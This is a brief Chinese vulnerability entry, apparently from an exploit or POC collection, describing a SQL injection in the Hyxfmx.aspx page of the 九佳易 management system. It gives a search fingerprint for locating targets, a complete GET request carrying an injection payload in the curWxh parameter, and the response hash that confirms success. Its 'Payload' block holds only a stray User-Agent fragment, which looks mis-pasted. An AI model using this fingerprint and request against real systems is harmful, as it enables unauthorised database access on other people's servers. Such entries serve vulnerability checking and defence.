# 九佳易管理系统Hyxfmx存在SQL注入漏洞

九佳易管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/Scripts/Login_A8/"`
- **请求**：`GET /HuiYuan/Hyxfmx.aspx?curWxh=1')+and+1111+in+(select+sys.fn_sqlvarbasetostr(HashBytes('MD5','123')))--+ HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
```
- **响应特征**：200 202cb962